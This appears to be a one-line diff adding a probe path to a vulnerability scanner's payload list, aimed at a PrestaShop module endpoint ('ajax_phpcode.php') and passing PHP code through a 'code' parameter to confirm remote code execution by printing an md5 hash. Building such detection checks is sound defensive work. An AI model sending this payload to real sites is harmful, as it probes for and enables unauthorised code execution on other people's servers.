@@ -1,0 +1,1 @@
+/modules/bamegamenu/ajax_phpcode.php?code=print(md5({{num}}))
